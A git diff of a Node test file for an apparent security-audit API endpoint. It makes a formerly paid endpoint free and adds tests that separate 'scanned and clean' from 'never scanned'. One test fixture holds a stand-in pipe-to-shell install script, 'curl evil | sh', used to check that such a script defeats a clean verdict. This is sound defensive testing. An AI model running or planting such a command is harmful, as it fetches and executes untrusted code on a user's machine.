@@ -1,12 +1,11 @@
 // node --test functions/api/security.test.mjs
 //
-// /api/security is the delivery path for the audit's paid half, so it is a paywall, and a paywall
-// that fails open is worse than none: it would hand away the one thing $6 buys while still charging
-// for it. Every negative path below exists because a positive-looking failure already shipped once
-// on /api/status, where a 404 from the billing provider was read as "valid".
-//
-// The bucket arithmetic is pinned against pipeline/push_security.py. If those two ever disagree,
-// every lookup misses and a paying customer gets 404s that look exactly like "nothing recorded".
+// /api/security IS FREE. It used to be a paywall priced at $0.01 and it sold nothing: redact_paid()
+// had already moved advisory detail and the install command into the public export, and
+// /v0.1/lookup returns all of it per capability with no account. The tests that guarded the licence
+// gate were NOT deleted with it — they are in history.test.mjs now, against the endpoint that is
+// genuinely paid. What is tested here is that this one stays free, and that it can tell "scanned
+// and clean" apart from "never scanned".
 
 import { strict as assert } from "node:assert";
 import test from "node:test";
@@ -42,6 +41,12 @@ const ENV = (over = {}) => ({
   ...over,
 });
 
+// A store holding exactly one capability's record, sharded the way push_security.py shards it.
+const kvWith = (id, rec) => kv({
+  ["sec:" + bucketOf(id)]: { [id]: rec },
+  "sec:meta": { shards: 1, capabilities: 1, pushed_at: "2026-08-14T15:20:52+00:00" },
+});
+
 function stubPolar(reply) {
   const real = globalThis.fetch;
   globalThis.fetch = async () => reply();
@@ -56,40 +61,36 @@ const req = (q = "?id=" + encodeURIComponent(ID), headers = {}) =>
 
 const withKey = (h = {}) => ({ authorization: "Bearer " + KEY, ...h });
 
-// ---- the gate -----------------------------------------------------------------------------------
+// ---- free, and it must stay that way -----------------------------------------------------------
 
-test("no licence gets nothing", async () => {
+test("no licence needed — this endpoint is free", async () => {
+  // The regression this locks out is re-gating it. Everything here is already public in
+  // /data/lookup.json and /v0.1/lookup; a 402 would charge for data we publish for nothing.
   const r = await onRequestGet({ request: req(), env: ENV() });
-  assert.equal(r.status, 402);   // no credential is a price quote, not an auth failure
-  assert.ok(!(await r.text()).includes("GHSA"), "an unauthenticated response leaked the advisory");
+  assert.equal(r.status, 200, "a caller with no credential must get the audit");
+  const b = await r.json();
+  assert.equal(b.advisories[0].id, "GHSA-95hg-3c55-xf9x");
+  assert.equal(b.licence, "free");
 });
 
-test("an invalid licence gets nothing — the /api/status bug, guarded", async () => {
-  const un = stubPolar(rejected);
-  try {
-    const r = await onRequestGet({ request: req(undefined, withKey()), env: ENV() });
-    assert.equal(r.status, 403);
-    assert.ok(!(await r.text()).includes("post-install"), "a refused request leaked the install command");
-  } finally { un(); }
-});
-
-test("an unconfigured deployment refuses rather than serving", async () => {
-  const r = await onRequestGet({ request: req(undefined, withKey()), env: { TASHAN_KV: kv() } });
-  assert.equal(r.status, 503);
-});
-
-test("the billing provider being down never opens the gate", async () => {
+test("no credential is required even when Polar is unreachable", async () => {
+  // A free endpoint must not depend on the billing provider at all. If this ever starts failing,
+  // the licence gate has been reintroduced.
   const un = stubPolar(down);
   try {
-    const r = await onRequestGet({ request: req(undefined, withKey()), env: ENV() });
-    assert.ok(r.status >= 400, "a 5xx from Polar must not be read as a valid licence");
-    assert.ok(!(await r.text()).includes("GHSA"));
+    const r = await onRequestGet({ request: req(), env: ENV() });
+    assert.equal(r.status, 200);
   } finally { un(); }
+});
+
+test("an unconfigured deployment says so rather than pretending there is nothing", async () => {
+  const r = await onRequestGet({ request: req(), env: { TASHAN_KV: null } });
+  assert.equal(r.status, 503);
 });
 
 // ---- the payload --------------------------------------------------------------------------------
 
-test("a valid licence gets exactly what the pricing page sells", async () => {
+test("the audit carries what a caller needs in order to act", async () => {
   const un = stubPolar(granted);
   try {
     const r = await onRequestGet({ request: req(undefined, withKey()), env: ENV() });
@@ -106,15 +107,12 @@ test("a valid licence gets exactly what the pricing page sells", async () => {
   } finally { un(); }
 });
 
-test("paid data is never cached by a shared cache", async () => {
-  const un = stubPolar(granted);
-  try {
-    const r = await onRequestGet({ request: req(undefined, withKey()), env: ENV() });
-    assert.match(r.headers.get("cache-control") || "", /private/);
-  } finally { un(); }
+test("free data is shared-cacheable — it is the same audit the dossier publishes", async () => {
+  const r = await onRequestGet({ request: req(), env: ENV() });
+  assert.match(r.headers.get("cache-control") || "", /public/);
 });
 
-test("the browser session cookie is accepted, so the website can differentiate", async () => {
+test("a session cookie is harmless — it neither unlocks nor blocks anything", async () => {
   // This is the whole point of the endpoint: before it existed, capability.js never checked for a
   // licence and a paying customer saw exactly what a stranger saw on every page of the site.
   const un = stubPolar(granted);
@@ -136,7 +134,53 @@ test("a capability with nothing recorded is a stated 404, never an implied clean
     assert.equal(r.status, 404);
     const b = await r.json();
     assert.equal(b.detail, null);
-    assert.ok(!/clean|clear|safe|no known/i.test(b.note), `misleading note: ${b.note}`);
+    // STRENGTHENED, not relaxed. This used to forbid the substring "clean" anywhere in the note,
+    // which also forbids saying "unknown, NOT clean" — the sentence that most directly prevents the
+    // misreading. What matters is that no clean scan is ASSERTED, and that the real state is named.
+    assert.equal(b.scanned, false, "the 404 must state that nothing was scanned, not merely omit it");
+    assert.ok(/has not been scanned/i.test(b.note), `must name the real state: ${b.note}`);
+    assert.ok(!/\b(is clean|looks clean|no known (issues|vulnerabilit)|nothing found|clear of|is safe)\b/i
+                .test(b.note), `asserts a clean scan it cannot support: ${b.note}`);
+  } finally { un(); }
+});
+
+test("a scanned-clean capability is a 200 that says so — not a 404", async () => {
+  // THE DEFECT THIS LOCKS OUT. The store only carried rows with a finding, so 7,366 of 7,862
+  // scanned capabilities answered "no audit detail recorded" — including chrome-devtools-mcp and
+  // @playwright/mcp, verified against a real Pro session. For a security-audit product, "we checked
+  // it and found nothing" IS the thing being paid for; a 404 reads as having no coverage.
+  const un = stubPolar(granted);
+  try {
+    const env = ENV();
+    const id = "pkg:spotless";
+    env.TASHAN_KV = kvWith(id, { t: "2026-08-14T15:20:52+00:00" });   // only a timestamp: clean
+    const r = await onRequestGet({ request: req("?id=" + id, withKey()), env });
+    assert.equal(r.status, 200, "a scanned-clean row must not 404");
+    const b = await r.json();
+    assert.equal(b.scanned, true);
+    assert.equal(b.clean, true, "clean must be stated, not inferred from two empty fields");
+    assert.deepEqual(b.advisories, []);
+    assert.equal(b.install_script, null);
+    // The DATE is the claim — a scan from six weeks ago is a different answer from one last night.
+    assert.equal(b.scanned_at, "2026-08-14T15:20:52+00:00");
+  } finally { un(); }
+});
+
+test("a row WITH findings is never reported as clean", async () => {
+  const un = stubPolar(granted);
+  try {
+    const env = ENV();
+    const id = "pkg:bad";
+    env.TASHAN_KV = kvWith(id, { t: "2026-08-14T00:00:00+00:00",
+                                 a: [{ id: "GHSA-x", severity: "HIGH" }] });
+    const b = await (await onRequestGet({ request: req("?id=" + id, withKey()), env })).json();
+    assert.equal(b.clean, false, "a row carrying an advisory must never say clean");
+    assert.equal(b.advisories.length, 1);
+
+    const id2 = "pkg:script";
+    env.TASHAN_KV = kvWith(id2, { t: "2026-08-14T00:00:00+00:00", s: "curl evil | sh" });
+    const b2 = await (await onRequestGet({ request: req("?id=" + id2, withKey()), env })).json();
+    assert.equal(b2.clean, false, "an install script alone must also defeat clean");
   } finally { un(); }
 });
 
